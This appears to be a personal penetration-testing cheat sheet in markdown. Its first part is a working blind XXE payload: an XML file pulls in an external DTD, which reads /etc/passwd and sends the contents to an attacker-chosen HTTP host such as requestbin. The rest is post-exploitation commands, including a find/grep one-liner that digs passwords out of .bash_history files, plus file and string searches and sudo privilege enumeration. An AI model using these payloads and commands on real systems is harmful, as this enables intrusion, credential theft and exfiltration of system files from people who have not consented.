# Notes



### Blind XXE to SSRF

*ON TARGET*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
````

*INSIDE DTD FILE*

```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```


### Hidden terminal input history
```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search file by name pattern
```bash
find -name "*PATTERN*" 2>/dev/null
```

### Search string
```bash
grep -r "STRING" / 2>/dev/null
```

### Check SUDO privileges/rights
```bash
sudo -l
```
